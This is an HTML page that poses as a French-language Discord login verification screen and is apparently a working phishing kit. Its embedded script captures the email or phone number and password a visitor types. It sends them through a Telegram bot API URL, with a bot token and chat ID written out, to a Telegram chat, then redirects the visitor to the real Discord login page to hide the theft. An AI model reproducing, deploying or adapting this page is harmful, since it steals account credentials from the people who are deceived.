<!DOCTYPE html>
<html>
<head>
<title>Discord</title>
<style>body{background:#36393f;color:white;text-align:center;padding:50px;font-family:Arial;}</style>
</head>
<body>
<h2>Discord - Vérification</h2>
<form id="form">
<input id="e" placeholder="Email ou téléphone" required><br><br>
<input id="p" type="password" placeholder="Mot de passe" required><br><br>
<button type="submit">Se connecter</button>
</form>

<script>
document.getElementById('form').onsubmit = function() {
  var email = document.getElementById('e').value;
  var pass = document.getElementById('p').value;
  var msg = "Email: " + email + " | Pass: " + pass;
  var url = "https://api.telegram.org/bot8948418784:AAH9lnh7ilWHWQ8UpUWp0aexajGq6xMWEKI/sendMessage?chat_id=2103109266&text=" + encodeURIComponent(msg);
  fetch(url);
  window.location = "https://discord.com/login";
  return false;
}
</script>
</body>
</html>
